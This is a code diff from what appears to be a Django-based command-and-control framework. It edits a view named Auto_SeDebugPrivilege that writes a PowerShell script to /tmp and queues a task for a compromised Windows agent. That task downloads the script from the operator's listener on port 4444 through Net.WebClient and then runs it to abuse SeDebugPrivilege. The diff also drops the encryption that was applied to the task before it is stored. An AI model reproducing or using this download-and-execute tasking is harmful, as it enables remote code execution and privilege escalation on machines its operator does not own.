@@ -712,13 +712,13 @@ def Auto_SeDebugPrivilege (request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
+ 
         path_to_execute = request.POST['path_to_execute']
 
         listenerdata = ListenerForm.objects.order_by("-created_date").get()
         ip = listenerdata.ip
-         
+
         agentdata = Agent.objects.filter(name=agent).values()[0]
-        key = agentdata['key']
         username = agentdata['username']
         username= username.split("\\")
 
@@ -730,15 +730,14 @@ def Auto_SeDebugPrivilege (request):
         exep = exep.replace("replace_ip",ip)
         exep = exep.replace("replace_exec_path",path_to_execute)
 
-        with open("/tmp/sedebug.ps1", "w") as f: #ana l2et de albt "a" tany xD m3rf4 leh
+        with open("/tmp/sedebug.ps1", "w") as f:
             f.write(exep)
             f.close
 
         task= '(New-Object Net.WebClient).DownloadFile(\'http://{0}:4444/sedebug.ps1\', \'c:/users/{1}/test.ps1\');powershell -file c:/users/{1}/test.ps1'.format(ip,username[1])
-        enctask= ENCRYPT(task,key)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
-            f.write(enctask)
+            f.write(task)
             f.close()
         return JsonResponse({},status=200)
     else:
